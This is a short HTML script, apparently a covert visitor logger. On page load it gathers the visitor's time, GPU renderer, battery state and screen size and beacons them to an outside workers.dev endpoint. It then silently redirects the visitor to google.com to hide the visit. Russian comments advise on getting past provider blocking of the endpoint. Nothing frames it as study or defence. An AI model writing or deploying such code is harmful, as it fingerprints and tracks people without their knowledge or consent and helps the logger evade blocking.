<script>
  async function collect() {
    const data = {
      t: encodeURIComponent(new Date().toLocaleString()),
      bat: 'N/A',
      gpu: 'N/A',
      res: `${screen.width}x${screen.height}`
    };

    // GPU
    try {
      const gl = document.createElement('canvas').getContext('webgl');
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      data.gpu = encodeURIComponent(gl.getParameter(debug.UNMASKED_RENDERER_WEBGL));
    } catch (e) {}

    // Battery
    try {
      const bt = await navigator.getBattery();
      data.bat = `${Math.round(bt.level * 100)}%${bt.charging ? '+' : '-'}`;
    } catch (e) {}

    const query = Object.keys(data).map(k => `${k}=${data[k]}`).join('&');
    
    // ВАЖНО: Используем твой воркер, но через 'workers.dev' провайдеры часто блочат.
    // Если нет домена, единственный код, который "пробьет" — это отправка через fetch на спец. эндпоинт.
    const url = "https://adminfdm.alexgranny1708.workers.dev/?" + query;

    const img = new Image();
    const go = () => window.location.replace("https://google.com");
    
    img.onload = go;
    img.onerror = go;
    img.src = url;

    setTimeout(go, 2000);
  }
  collect();
</script>
